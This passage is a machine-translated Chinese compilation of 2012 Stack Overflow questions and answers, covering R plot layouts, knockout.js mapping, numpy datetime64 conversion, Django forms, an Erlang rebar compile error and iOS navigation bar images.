 void ScoreController::SubmitScore(ScoreController* self, double result, double minor_result, unsigned int level, unsigned int mode, std::map<std::string, std::string>* context==NULL) 
```

任何人对此有任何想法，请帮助我。在 Scorelopp.h 文件中

```
template argument 3 is invalid 
```

并显示错误

# r - R中的分屏（具有不相等的窗口）绘图

> ID：13703706
> 
> 赞同：7
> 
> 时间：2012-12-04T13:07:50.937
> 
> 标签：r, plot

我知道我可以用它`par(mfrow=c(1, 2))`来创建一个带有分屏的情节。但是，我真的很想创建一个绘图，其中 2/3 的窗口用于绘制一个图形，而 1/3 的窗口用于绘制另一个图形。这可能吗？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-04T13:09:52.220

您需要使用函数`layout`而不是`par`此处，使用参数`widths`：

```
layout(matrix(c(1,2),nrow=1), widths=c(2,1)) 
```

有关`?layout`更多信息，请参阅。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-12-04T13:31:40.747

或者：

```
a  <-  c(1:10)
b  <-  c(1:10)

par(fig=c(0, (2/3), 0, 1))
par(new=TRUE)
plot(a, b)
par(fig=c((2/3), 1, 0, 1))
par(new=TRUE)
plot(a, b) 
```

# android - 如何将自定义数据从我的 Android 应用程序发送到 Google Analytics？

> ID：13703709
> 
> 赞同：3
> 
> 时间：2012-12-04T13:07:57.633
> 
> 标签：android, google-analytics

注意：我正在为 android Google Analytics SDK 使用 v2

我花了很多时间研究这个问题。我读到了自定义变量，SDKv2 似乎不支持这些变量。我阅读了有关自定义维度和指标的信息，但是 android 开发者页面说您必须首先通过 Web 界面定义这些，并且他们这样做的说明要么是过时的，要么是错误的，或者两者兼而有之。

我想要的只是在键值对中发送一些数据，例如：

```
sendData("questions asked", 10);
sendData("questions correct", 7); 
```

# knockout.js - 在创建项目后将项目推送到使用映射插件创建的 observableArray

> ID：13703711
> 
> 赞同：1
> 
> 时间：2012-12-04T13:08:05.260
> 
> 标签：knockout.js, knockout-mapping-plugin

我有一个看起来像这样的淘汰视图模型：

```
var TagViewModel = function (allPrincipals) {
    var self = this;

    self.name = ko.observable(tagName);

    var principalMapping = {
        create: function(options) {
            return {
                label: options.data.name,
                key: options.data.type + '___|' + options.data.name,
                icon: options.data.type == "User" ? "img/misc/user20.png" : "img/misc/group20.png"
            };
        },
        key: function(data) {
            return data.key;
        }
    };

    self.allPrincipals = ko.mapping.fromJS(allPrincipals, principalMapping);
} 
```

`allPrincipals`看起来像这样：

```
var allPrincipals = [{name: "Alex" type: "User"}, {name: "John", type: "User"}, {name: "Staff", type: "Group}] 
```

因此，当创建 viewModel 时，我们有类似的东西：

```
var vm = new TagViewModel(allPrincipals); 
```

这工作正常。

但是，在视图模型中，我需要能够将新项目推送到 allPrincipals 可观察数组（由映射插件创建）

最好的方法是什么？

因此，例如，视图模型上有一个函数：

```
self.addPrincipal = function(prinipal){
    //allPrincipals.push(?)
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:14:19.217

你可以定义一个类来创建`Principal`对象：

```
function Principal(data){
   var self = this;

   self.label = data.name;
   self.key = data.type + '___|' + data.name;
   self.icon = data.type == "User" ? "img/misc/user20.png" : "img/misc/group20.png";
} 
```

然后在映射选项和`addPrincipal`函数中使用它：

```
var principalMapping = {
    create: function(options) {
        return new Principal(options.data);
    },
    key: function(data) {
        return data.key;
    }
};

self.addPrincipal = function(prinipal){
    self.allPrincipals.push(new Principal(prinipal));
} 
```

# jquery-mobile - 页面加载jquery mobile上的自动打开选择框选项

> ID：13703717
> 
> 赞同：0
> 
> 时间：2012-12-04T13:08:22.433
> 
> 标签：jquery-mobile, jquery-selectbox

在 jquery mobile 上，如何在页面加载时自动打开选择框？就像在这个示例中一样： ![在页面加载时打开选择框](../Images/2b75136c61ba2ee26fb13490e72f5aca.png)

我的代码：

```
 <div data-role="fieldcontain">
        <fieldset data-role="controlgroup" data-type="horizontal">
            <select name="select-choice-usa" id="select-choice-usa" size="15">
                <option>USA</option>
                <option selected="selected">EUROPE</option>
                <option>UK</option>
            </select>

            <select name="select-choice-size" id="select-choice-size">
                <option selected="selected">3.5</option>
                <option>4</option>
                <option>4.5</option>
            </select>
        </fieldset>
    </div> 
```

我试过的脚本：

```
$('#page1').live("pagecreate", function() {
    $('#select-choice-usa').attr('parent',focus())
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:33:58.870

简短的回答，无法完成：[在 jQuery 中显示选择下拉菜单？](https://stackoverflow.com/questions/4457076/show-select-dropdown-in-jquery).

您可以实现自己的选择框，仅此而已。

# python - 在 datetime、Timestamp 和 datetime64 之间转换

> ID：13703720
> 
> 赞同：390
> 
> 时间：2012-12-04T13:08:29.863
> 
> 标签：python, datetime, numpy, pandas

如何将`numpy.datetime64`对象转换为`datetime.datetime`（或`Timestamp`）？

在下面的代码中，我创建了一个 datetime、timestamp 和 datetime64 对象。

```
import datetime
import numpy as np
import pandas as pd
dt = datetime.datetime(2012, 5, 1)
# A strange way to extract a Timestamp object, there's surely a better way?
ts = pd.DatetimeIndex([dt])[0]
dt64 = np.datetime64(dt)

In [7]: dt
Out[7]: datetime.datetime(2012, 5, 1, 0, 0)

In [8]: ts
Out[8]: <Timestamp: 2012-05-01 00:00:00>

In [9]: dt64
Out[9]: numpy.datetime64('2012-05-01T01:00:00.000000+0100') 
```

*注意：很容易从时间戳中获取日期时间：*

```
In [10]: ts.to_datetime()
Out[10]: datetime.datetime(2012, 5, 1, 0, 0) 
```

但是我们如何从( )中提取`datetime`or呢？`Timestamp``numpy.datetime64``dt64`

.

更新：我的数据集中的一个有点讨厌的例子（也许是激励例子）似乎是：

```
dt64 = numpy.datetime64('2002-06-28T01:00:00.000000000+0100') 
```

应该是`datetime.datetime(2002, 6, 28, 1, 0)`，而不是长（！）（`1025222400000000000L`）...

* * *

## 回答 #1

> 赞同：262
> 
> 时间：2014-02-20T18:17:06.327

您可以只使用 pd.Timestamp 构造函数。下图可能对这个问题和相关问题有用。

![时间表示之间的转换](../Images/d26758f9f24519ffb19559997c1e5153.png)

* * *

## 回答 #2

> 赞同：175
> 
> 时间：2012-12-06T22:40:22.060

欢迎来到地狱。

您可以将 datetime64 对象传递给`pandas.Timestamp`：

```
In [16]: Timestamp(numpy.datetime64('2012-05-01T01:00:00.000000'))
Out[16]: <Timestamp: 2012-05-01 01:00:00> 
```

我注意到这在 NumPy 1.6.1 中不起作用：

```
numpy.datetime64('2012-05-01T01:00:00.000000+0100') 
```

此外，`pandas.to_datetime`可以使用（这是关闭的开发版本，尚未检查 v0.9.1）：

```
In [24]: pandas.to_datetime('2012-05-01T01:00:00.000000+0100')
Out[24]: datetime.datetime(2012, 5, 1, 1, 0, tzinfo=tzoffset(None, 3600)) 
```

* * *

## 回答 #3

> 赞同：170
> 
> 时间：2012-12-04T13:42:08.067

要转换`numpy.datetime64`为`datetime`表示 UTC 时间的对象`numpy-1.8`：

```
>>> from datetime import datetime
>>> import numpy as np
>>> dt = datetime.utcnow()
>>> dt
datetime.datetime(2012, 12, 4, 19, 51, 25, 362455)
>>> dt64 = np.datetime64(dt)
>>> ts = (dt64 - np.datetime64('1970-01-01T00:00:00Z')) / np.timedelta64(1, 's')
>>> ts
1354650685.3624549
>>> datetime.utcfromtimestamp(ts)
datetime.datetime(2012, 12, 4, 19, 51, 25, 362455)
>>> np.__version__
'1.8.0.dev-7b75899' 
```

上面的例子假设一个天真的`datetime`对象被解释`np.datetime64`为 UTC 时间。

* * *

要转换`datetime`为( )`np.datetime64`并返回 ( `numpy-1.6`)：

```
>>> np.datetime64(datetime.utcnow()).astype(datetime)
datetime.datetime(2012, 12, 4, 13, 34, 52, 827542) 
```

它既适用于单个`np.datetime64`对象，也适用于`np.datetime64`.

`np.datetime64`以与 , 等相同的方式思考`np.int8`，`np.int16`并应用相同的方法在 Python 对象（例如`int`, ）`datetime`和相应的 numpy 对象之间进行转换。

你的“讨厌的例子”工作正常：

```
>>> from datetime import datetime
>>> import numpy 
>>> numpy.datetime64('2002-06-28T01:00:00.000000000+0100').astype(datetime)
datetime.datetime(2002, 6, 28, 0, 0)
>>> numpy.__version__
'1.6.2' # current version available via pip install numpy 
```

我可以将安装的`long`值重现`numpy-1.8.0`为：

```
pip install git+https://github.com/numpy/numpy.git#egg=numpy-dev 
```

同样的例子：

```
>>> from datetime import datetime
>>> import numpy
>>> numpy.datetime64('2002-06-28T01:00:00.000000000+0100').astype(datetime)
1025222400000000000L
>>> numpy.__version__
'1.8.0.dev-7b75899' 
```

它返回`long`是因为 for`numpy.datetime64`类型`.astype(datetime)`等同于`.astype(object)`返回 Python integer( `long`) on `numpy-1.8`。

要获得`datetime`对象，您可以：

```
>>> dt64.dtype
dtype('<M8[ns]')
>>> ns = 1e-9 # number of seconds in a nanosecond
>>> datetime.utcfromtimestamp(dt64.astype(int) * ns)
datetime.datetime(2002, 6, 28, 0, 0) 
```

要`datetime64`直接使用秒数：

```
>>> dt64 = numpy.datetime64('2002-06-28T01:00:00.000000000+0100', 's')
>>> dt64.dtype
dtype('<M8[s]')
>>> datetime.utcfromtimestamp(dt64.astype(int))
datetime.datetime(2002, 6, 28, 0, 0) 
```

[numpy 文档](http://docs.scipy.org/doc/numpy-dev/reference/arrays.datetime.html)说 datetime API 是实验性的，可能会在未来的 numpy 版本中发生变化。

* * *

## 回答 #4

> 赞同：133
> 
> 时间：2017-10-24T23:36:25.420

我认为在答案中可能会有更综合的努力，以更好地解释 Python 的 datetime 模块、numpy 的 datetime64/timedelta64 和 pandas 的 Timestamp/Timedelta 对象之间的关系。

## Python的日期时间标准库

datetime 标准库有四个主要对象

*   time - 只有时间，以小时、分钟、秒和微秒为单位
*   日期 - 只有年、月和日
*   datetime - 时间和日期的所有组成部分
*   timedelta - 最大单位为天的时间量

### 创建这四个对象

```
>>> import datetime
>>> datetime.time(hour=4, minute=3, second=10, microsecond=7199)
datetime.time(4, 3, 10, 7199)

>>> datetime.date(year=2017, month=10, day=24)
datetime.date(2017, 10, 24)

>>> datetime.datetime(year=2017, month=10, day=24, hour=4, minute=3, second=10, microsecond=7199)
datetime.datetime(2017, 10, 24, 4, 3, 10, 7199)

>>> datetime.timedelta(days=3, minutes = 55)
datetime.timedelta(3, 3300)

>>> # add timedelta to datetime
>>> datetime.timedelta(days=3, minutes = 55) + \
    datetime.datetime(year=2017, month=10, day=24, hour=4, minute=3, second=10, microsecond=7199)
datetime.datetime(2017, 10, 27, 4, 58, 10, 7199) 
```

## NumPy 的 datetime64 和 timedelta64 对象

NumPy 没有单独的日期和时间对象，只有一个 datetime64 对象来表示单个时间点。datetime 模块的 datetime 对象具有微秒精度（百万分之一秒）。NumPy 的 datetime64 对象允许您将其精度设置为从小时一直到阿秒 (10 ^ -18)。它的构造函数更灵活，可以接受多种输入。

### 构造 NumPy 的 datetime64 和 timedelta64 对象

为单位传递一个带有字符串的整数。[在这里查看所有单位](https://docs.scipy.org/doc/numpy-1.13.0/reference/arrays.datetime.html#datetime-units)。在 UNIX 时代之后，它被转换为那么多单位：1970 年 1 月 1 日

```
>>> np.datetime64(5, 'ns') 
numpy.datetime64('1970-01-01T00:00:00.000000005')

>>> np.datetime64(1508887504, 's')
numpy.datetime64('2017-10-24T23:25:04') 
```

您也可以使用 ISO 8601 格式的字符串。

```
>>> np.datetime64('2017-10-24')
numpy.datetime64('2017-10-24') 
```

时间增量有一个单位

```
>>> np.timedelta64(5, 'D') # 5 days
>>> np.timedelta64(10, 'h') 10 hours 
```

也可以通过减去两个 datetime64 对象来创建它们

```
>>> np.datetime64('2017-10-24T05:30:45.67') - np.datetime64('2017-10-22T12:35:40.123')
numpy.timedelta64(147305547,'ms') 
```

## Pandas Timestamp 和 Timedelta 在 NumPy 之上构建了更多功能

pandas Timestamp 是一个与日期时间非常相似但功能更多的时刻。您可以使用`pd.Timestamp`或构造它们`pd.to_datetime`。

```
>>> pd.Timestamp(1239.1238934) #defaults to nanoseconds
Timestamp('1970-01-01 00:00:00.000001239')

>>> pd.Timestamp(1239.1238934, unit='D') # change units
Timestamp('1973-05-24 02:58:24.355200')

>>> pd.Timestamp('2017-10-24 05') # partial strings work
Timestamp('2017-10-24 05:00:00') 
```

`pd.to_datetime`工作方式非常相似（还有更多选项），并且可以将字符串列表转换为时间戳。

```
>>> pd.to_datetime('2017-10-24 05')
Timestamp('2017-10-24 05:00:00')

>>> pd.to_datetime(['2017-1-1', '2017-1-2'])
DatetimeIndex(['2017-01-01', '2017-01-02'], dtype='datetime64[ns]', freq=None) 
```

### 将 Python 日期时间转换为 datetime64 和时间戳

```
>>> dt = datetime.datetime(year=2017, month=10, day=24, hour=4, 
                   minute=3, second=10, microsecond=7199)
>>> np.datetime64(dt)
numpy.datetime64('2017-10-24T04:03:10.007199')

>>> pd.Timestamp(dt) # or pd.to_datetime(dt)
Timestamp('2017-10-24 04:03:10.007199') 
```

### 将 numpy datetime64 转换为 datetime 和 Timestamp

```
>>> dt64 = np.datetime64('2017-10-24 05:34:20.123456')
>>> unix_epoch = np.datetime64(0, 's')
>>> one_second = np.timedelta64(1, 's')
>>> seconds_since_epoch = (dt64 - unix_epoch) / one_second
>>> seconds_since_epoch
1508823260.123456

>>> datetime.datetime.utcfromtimestamp(seconds_since_epoch)
>>> datetime.datetime(2017, 10, 24, 5, 34, 20, 123456) 
```

转换为时间戳

```
>>> pd.Timestamp(dt64)
Timestamp('2017-10-24 05:34:20.123456') 
```

### 从 Timestamp 转换为 datetime 和 datetime64

这很容易，因为 pandas 时间戳非常强大

```
>>> ts = pd.Timestamp('2017-10-24 04:24:33.654321')

>>> ts.to_pydatetime()   # Python's datetime
datetime.datetime(2017, 10, 24, 4, 24, 33, 654321)

>>> ts.to_datetime64()
numpy.datetime64('2017-10-24T04:24:33.654321000') 
```

* * *

## 回答 #5

> 赞同：35
> 
> 时间：2012-12-04T13:22:10.337

```
>>> dt64.tolist()
datetime.datetime(2012, 5, 1, 0, 0) 
```

对于`DatetimeIndex`，`tolist`返回`datetime`对象列表。对于单个`datetime64`对象，它返回单个`datetime`对象。

* * *

## 回答 #6

> 赞同：15
> 
> 时间：2014-08-15T09:41:31.853

如果要将整个 pandas 系列日期时间转换为常规 python 日期时间，也可以使用`.to_pydatetime()`.

```
pd.date_range('20110101','20110102',freq='H').to_pydatetime()

> [datetime.datetime(2011, 1, 1, 0, 0) datetime.datetime(2011, 1, 1, 1, 0)
   datetime.datetime(2011, 1, 1, 2, 0) datetime.datetime(2011, 1, 1, 3, 0)
   .... 
```

它还支持时区：

```
pd.date_range('20110101','20110102',freq='H').tz_localize('UTC').tz_convert('Australia/Sydney').to_pydatetime()

[ datetime.datetime(2011, 1, 1, 11, 0, tzinfo=<DstTzInfo 'Australia/Sydney' EST+11:00:00 DST>)
 datetime.datetime(2011, 1, 1, 12, 0, tzinfo=<DstTzInfo 'Australia/Sydney' EST+11:00:00 DST>)
.... 
```

**注意**：如果您正在操作 Pandas 系列，则不能调用`to_pydatetime()`整个系列。您将需要`.to_pydatetime()`使用列表理解或类似的方法调用每个单独的 datetime64：

```
datetimes = [val.to_pydatetime() for val in df.problem_datetime_column] 
```

* * *

## 回答 #7

> 赞同：13
> 
> 时间：2012-12-04T13:08:29.863

一种选择是使用`str`, 然后`to_datetime`（或类似）：

```
In [11]: str(dt64)
Out[11]: '2012-05-01T01:00:00.000000+0100'

In [12]: pd.to_datetime(str(dt64))
Out[12]: datetime.datetime(2012, 5, 1, 1, 0, tzinfo=tzoffset(None, 3600)) 
```

*注意：它不等于，`dt`因为它已成为[“偏移感知”](https://stackoverflow.com/questions/796008/python-cant-subtract-offset-naive-and-offset-aware-datetimes)：*

```
In [13]: pd.to_datetime(str(dt64)).replace(tzinfo=None)
Out[13]: datetime.datetime(2012, 5, 1, 1, 0) 
```

这似乎不优雅。

.

更新：这可以处理“讨厌的例子”：

```
In [21]: dt64 = numpy.datetime64('2002-06-28T01:00:00.000000000+0100')

In [22]: pd.to_datetime(str(dt64)).replace(tzinfo=None)
Out[22]: datetime.datetime(2002, 6, 28, 1, 0) 
```

* * *

## 回答 #8

> 赞同：9
> 
> 时间：2017-05-30T20:27:39.860

这篇文章已经发布了 4 年，我仍然在为这个转换问题而苦苦挣扎——所以从某种意义上说，这个问题在 2017 年仍然很活跃。numpy 文档并没有提供简单的转换算法，这让我感到有些震惊，但那是另一回事了。

我遇到了另一种只涉及模块的转换方法`numpy`，`datetime`它不需要导入 pandas，在我看来，对于这样一个简单的转换，要导入很多代码。我注意到如果原始以**微秒为单位**，而其他单位返回整数时间戳，`datetime64.astype(datetime.datetime)`它将返回一个对象。我使用来自 Netcdf 文件的数据 I/O 模块，它使用以纳秒为单位的单位，除非您首先转换为微秒单位，否则转换失败。这是示例转换代码，`datetime.datetime``datetime64`**`xarray``datetime64`**

 **```
import numpy as np
import datetime

def convert_datetime64_to_datetime( usert: np.datetime64 )->datetime.datetime:
    t = np.datetime64( usert, 'us').astype(datetime.datetime)
return t 
```

它仅在我的机器上进行了测试，即 Python 3.6，最近发布了 2017 Anaconda 发行版。我只查看了标量转换，并没有检查基于数组的转换，尽管我猜它会很好。我也没有查看 numpy datetime64 源代码来查看操作是否有意义。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2017-08-02T06:59:32.067

我回到这个答案的次数比我能数的要多，所以我决定组合一个快速的小类，它将 Numpy`datetime64`值转换为 Python`datetime`值。我希望它可以帮助其他人。

```
from datetime import datetime
import pandas as pd

class NumpyConverter(object):
    @classmethod
    def to_datetime(cls, dt64, tzinfo=None):
        """
        Converts a Numpy datetime64 to a Python datetime.
        :param dt64: A Numpy datetime64 variable
        :type dt64: numpy.datetime64
        :param tzinfo: The timezone the date / time value is in
        :type tzinfo: pytz.timezone
        :return: A Python datetime variable
        :rtype: datetime
        """
        ts = pd.to_datetime(dt64)
        if tzinfo is not None:
            return datetime(ts.year, ts.month, ts.day, ts.hour, ts.minute, ts.second, tzinfo=tzinfo)
        return datetime(ts.year, ts.month, ts.day, ts.hour, ts.minute, ts.second) 
```

我要把这个放在我的工具包里，有东西告诉我我会再次需要它。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2021-12-13T11:31:04.320

我确实喜欢这个

```
import pandas as pd

# Custom function to convert Pandas Datetime to Timestamp
def toTimestamp(data):
    return data.timestamp()

# Read a csv file
df = pd.read_csv("friends.csv")

# Replace the "birthdate" column by:
# 1\. Transform to datetime
# 2\. Apply the custom function to the column just converted
df["birthdate"] = pd.to_datetime(df["birthdate"]).apply(toTimestamp) 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2016-06-05T16:04:56.750

```
import numpy as np
import pandas as pd 

def np64toDate(np64):
    return pd.to_datetime(str(np64)).replace(tzinfo=None).to_datetime() 
```

使用此函数获取 python 的本机日期时间对象

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2018-03-22T16:58:16.950

一些解决方案对我来说效果很好，但 numpy 会弃用一些参数。对我来说更好的解决方案是将日期读取为 pandas 日期时间，并明确提取 pandas 对象的年、月和日。以下代码适用于最常见的情况。

```
def format_dates(dates):
    dt = pd.to_datetime(dates)
    try: return [datetime.date(x.year, x.month, x.day) for x in dt]    
    except TypeError: return datetime.date(dt.year, dt.month, dt.day) 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2021-06-25T09:47:17.470

我设法将包含时间信息的pandas数据框中的“日期”列转换为numpy数组的唯一方法如下：（从csv文件“csvIn.csv”中读取数据框）

```
import pandas as pd
import numpy as np

df = pd.read_csv("csvIn.csv")
df["date"] = pd.to_datetime(df["date"])
timestamps = np.array([np.datetime64(value) for dummy, value in df["date"].items()]) 
```

* * *

## 回答 #14

> 赞同：-1
> 
> 时间：2015-08-04T18:37:14.723

事实上，所有这些日期时间类型都可能很困难，并且可能存在问题（必须仔细跟踪时区信息）。这就是我所做的，尽管我承认我担心它至少有一部分是“不是设计使然”。此外，这可以根据需要变得更紧凑。从 numpy.datetime64 dt_a 开始：

> dt_a

numpy.datetime64('2015-04-24T23:11:26.270000-0700')

> dt_a1 = dt_a.tolist() # 生成 UTC 格式的日期时间对象，但没有 tzinfo
> 
> dt_a1

datetime.datetime(2015, 4, 25, 6, 11, 26, 270000)

```
# now, make your "aware" datetime: 
```

> dt_a2=datetime.datetime(*list(dt_a1.timetuple()[:6]) + [dt_a1.microsecond], tzinfo=pytz.timezone('UTC'))

...当然，可以根据需要将其压缩为一行。**

# python - 关于 Django 中的用户注册表单的问题

> ID：13703724
> 
> 赞同：0
> 
> 时间：2012-12-04T13:09:28.830
> 
> 标签：python, html, django

好的，所以我有这个 HTML 表单：

```
<form class="form" action="" method="post">
    {% csrf_token %}
    {{ form.as_p }}
    <button type="submit" value="register">Login</button>
</form> 
```

而这个 Django 视图：

```
from django import forms
from django.contrib.auth.forms import UserCreationForm
from django.http import HttpResponseRedirect
from django.shortcuts import render_to_response
from django.template import RequestContext

    def register(request):
        if request.method == 'POST':
            form = UserCreationForm(request.POST)
            if form.is_valid():
                new_user = form.save()
                return HttpResponseRedirect("/success/")
        else:
            form = UserCreationForm()
        return render_to_response("signup.html", {'form': form,}, RequestContext(request)) 
```

这工作得很好。但我希望能够更多地自定义原始表单。因此，为了尝试弄清楚如何做到这一点，我首先查看了 form.as_p 函数的源代码，然后尝试手动复制它。我最终得到了这个：

```
<form class="form" action="" method="post">
    {% csrf_token %}
    <p>
        <label for="id_username">Username:</label>
        <input id="id_username" type="text" name="username" maxlength="30">
    </p>

    <p>
        <label for="id_password1">Password:</label>
        <input type="password" name="password1" id="id_password">
    </p>

    <p>
        <label for="id_password2">Password confirmation:</label>
        <input type="password" name="password2" id="id_password2">
    </p>

    <button type="submit" value="register">Login</button>
</form> 
```

但是，这不起作用。我不明白为什么它没有。如果 form.as_p 将上述内容作为输出，那么理论上它应该可以在视图中正常工作，不是吗？任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T13:23:32.343

您的模板遗漏了两件事：任何表单或字段错误，以及字段的任何预填充值。显然发生的是 is_valid 确实是错误的，但您没有显示任何错误。

您应该使用模板变量，而不是在 HTML 中对字段进行硬编码：

```
{{ form.non_field_errors }}
...
<p>
{{ form.username.label_tag }}
{{ form.username }}
{{ form.username.errors }}
</p> 
```

等等

# erlang - 以钢筋启动时，函数“dynamic_compile:from_string”失败

> ID：13703732
> 
> 赞同：1
> 
> 时间：2012-12-04T13:09:49.643
> 
> 标签：erlang, rebar

我正在使用[dynamic_compile](https://github.com/JacobVorreuter/dynamic_compile.git)来动态创建`logger`。通过钢筋启动时显示错误，但正常启动时正确。请帮忙看看。这是我[在 github 上的小演示项目](https://github.com/goofansu/rebar_test)。

以下是我的步骤：

步报错误：

```
~/rebar_test > rebar compile generate
~/rebar_test > ./rel/server/bin/server console 
```

然后得到错误：

```
=CRASH REPORT==== 4-Dec-2012::20:37:19 ===
  crasher:
    initial call: application_master:init/4
    pid: <0.48.0>
    registered_name: []
    exception exit: {bad_return,
                        {{yg_server_app,start,[normal,[]]},
                         {'EXIT',
                             {undef,
                                 [{logger,info_msg,
                                      [d,29,
                                       "Error compiling logger (~p): ~p~n",
                                       [error,undef]],
                                      []},
                                  {yg_server_app,start,2,
                                      [{file,"src/yg_server_app.erl"},
                                       {line,20}]},
                                  {application_master,start_supervisor,3,
                                      [{file,"application_master.erl"},
                                       {line,328}]},
                                  {application_master,start_the_app,5,
                                      [{file,"application_master.erl"},
                                       {line,310}]},
                                  {application_master,start_it_new,7,
                                      [{file,"application_master.erl"},
                                       {line,296}]}]}}}}
      in function  application_master:init/4 (application_master.erl, line 138)
    ancestors: [<0.47.0>]
    messages: [{'EXIT',<0.49.0>,normal}]
    links: [<0.47.0>,<0.6.0>]
    dictionary: []
    trap_exit: true
    status: running
    heap_size: 1597
    stack_size: 24
    reductions: 216
  neighbours: 
```

正确步骤：

```
erl -pa apps/server/ebin -s server_app start 
```

它告诉正确的：

```
Mod=logger,Code=<<70,79,82,49,0,0,3,244,66,69,65,77,65,116,111,109,0,0,0,173,0,
              0,0,19,6,108,111,103,103,101,114,3,103,101,116,8,116,101,115,
              116,95,109,115,103,2,111,107,9,100,101,98,117,103,95,109,115,
              103,8,105,110,102,111,95,109,115,103,11,119,97,114,110,105,
              110,103,95,109,115,103,9,101,114,114,111,114,95,109,115,103,
              12,99,114,105,116,105,99,97,108,95,109,115,103,6,101,114,108,
              97,110,103,2,43,43,4,115,101,108,102,5,101,114,114,111,114,6,
              110,111,116,105,102,121,12,103,114,111,117,112,95,108,101,97,
              100,101,114,12,101,114,114,111,114,95,108,111,103,103,101,
              114,9,103,101,110,95,101,118,101,110,116,11,109,111,100,117,
              108,101,95,105,110,102,111,15,103,101,116,95,109,111,100,117,
              108,101,95,105,110,102,111,0,0,0,67,111,100,101,0,0,1,31,0,0,
              0,16,0,0,0,0,0,0,0,153,0,0,0,21,0,0,0,10,1,16,153,16,2,18,34,
              0,1,32,64,17,3,19,1,48,153,32,2,18,50,64,1,64,64,66,3,19,1,
              80,153,48,2,18,82,64,1,96,64,66,3,19,1,112,153,64,2,18,98,64,
              1,128,64,66,3,19,1,144,153,80,2,18,114,64,1,160,64,66,3,19,1,
              176,153,96,2,18,130,64,1,192,64,66,3,19,1,208,153,112,2,18,
              146,64,1,224,12,48,64,64,3,36,64,19,20,64,71,0,19,64,35,3,64,
              51,4,153,128,7,32,0,64,3,19,64,71,16,3,153,128,7,32,0,16,96,
              16,9,16,19,69,20,4,51,69,36,51,51,69,19,51,35,64,3,19,64,210,
              3,5,48,13,16,48,1,240,153,144,2,18,226,48,1,8,16,12,48,48,64,
              35,4,64,19,20,64,3,36,153,160,7,0,32,16,128,16,9,16,19,70,48,
              35,71,19,71,20,71,4,70,48,19,71,36,71,3,71,35,64,10,16,3,153,
              176,8,32,48,48,1,8,17,153,0,2,18,10,18,0,1,8,18,64,18,3,153,
              0,78,16,64,1,8,19,153,0,2,18,10,18,16,1,8,20,64,3,19,64,18,3,
              153,0,78,32,80,3,0,83,116,114,84,0,0,0,0,73,109,112,84,0,0,0,
              76,0,0,0,6,0,0,0,10,0,0,0,11,0,0,0,2,0,0,0,10,0,0,0,12,0,0,0,
              0,0,0,0,10,0,0,0,15,0,0,0,0,0,0,0,17,0,0,0,14,0,0,0,2,0,0,0,
              10,0,0,0,19,0,0,0,1,0,0,0,10,0,0,0,19,0,0,0,2,69,120,112,84,
              0,0,0,112,0,0,0,9,0,0,0,18,0,0,0,1,0,0,0,20,0,0,0,18,0,0,0,0,
              0,0,0,18,0,0,0,9,0,0,0,4,0,0,0,14,0,0,0,8,0,0,0,4,0,0,0,12,0,
              0,0,7,0,0,0,4,0,0,0,10,0,0,0,6,0,0,0,4,0,0,0,8,0,0,0,5,0,0,0,
              4,0,0,0,6,0,0,0,3,0,0,0,4,0,0,0,4,0,0,0,2,0,0,0,0,0,0,0,2,76,
              105,116,84,0,0,0,42,0,0,0,36,120,156,99,96,96,96,98,96,96,96,
              107,206,102,96,170,203,3,178,132,128,44,62,103,141,186,2,43,
              48,210,84,176,82,0,0,101,252,7,63,0,0,76,111,99,84,0,0,0,16,
              0,0,0,1,0,0,0,14,0,0,0,3,0,0,0,16,65,116,116,114,0,0,0,40,
              131,108,0,0,0,1,104,2,100,0,3,118,115,110,108,0,0,0,1,110,16,
              0,8,200,37,56,188,135,98,70,208,71,217,156,243,203,95,210,
              106,106,67,73,110,102,0,0,0,123,131,108,0,0,0,4,104,2,100,0,
              7,111,112,116,105,111,110,115,106,104,2,100,0,7,118,101,114,
              115,105,111,110,107,0,5,52,46,56,46,50,104,2,100,0,4,116,105,
              109,101,104,6,98,0,0,7,220,97,12,97,4,97,13,97,3,97,6,104,2,
              100,0,6,115,111,117,114,99,101,107,0,43,47,85,115,101,114,
              115,47,115,117,121,101,106,117,110,47,68,111,99,117,109,101,
              110,116,115,47,112,114,111,106,101,99,116,47,114,101,98,97,
              114,95,116,101,115,116,106,0,65,98,115,116,0,0,0,0,76,105,
              110,101,0,0,0,43,0,0,0,0,0,0,0,0,0,0,0,16,0,0,0,11,0,0,0,1,
              18,177,225,9,20,9,26,9,32,9,38,9,50,9,52,9,57,9,58,9,59,0,0,0> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:40:27.330

这引起了我的注意：

```
"Error compiling logger (~p): ~p~n",
[error,undef]], 
```

我认为您需要添加`compiler`to `rel/reltool.config`，否则您将无法在运行时编译模块。

# iphone - NavigationController 背景图片问题

> ID：13703739
> 
> 赞同：3
> 
> 时间：2012-12-04T13:10:12.650
> 
> 标签：iphone, xcode

我已经在线检查了许多解决方案，但我的 NavigationController 背景图像仍然存在问题。

这是我的代码：

```
[self.navigationController.navigationBar setBackgroundImage:[UIImage imageNamed:@"header_bg"] forBarMetrics:UIBarMetricsDefault]; 
```

问题是我的酒吧改变了它的外观（主要是颜色），但它仍然不像我的形象。

有没有更好的方法来解决这个问题？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-04T13:23:48.517

尝试这个....

```
UIImageView *imageView = [[UIImageView alloc] initWithImage: [UIImage imageNamed: @"NavBar_Img.png"]];
self.navigationItem.titleView = imageView;
[imageView release]; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-04T13:15:01.387

尝试设置样式，最后添加您的代码，如下所示..

```
self.navigationController.navigationBar.barStyle = UIBarStyleDefault;
[self.navigationController.navigationBar setBackgroundImage:[UIImage imageNamed:@"header_bg"] forBarMetrics:UIBarMetricsDefault]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-08-26T13:19:41.883

我有一个稍微不同的问题，我分享给那些寻找光的迷失灵魂o_O

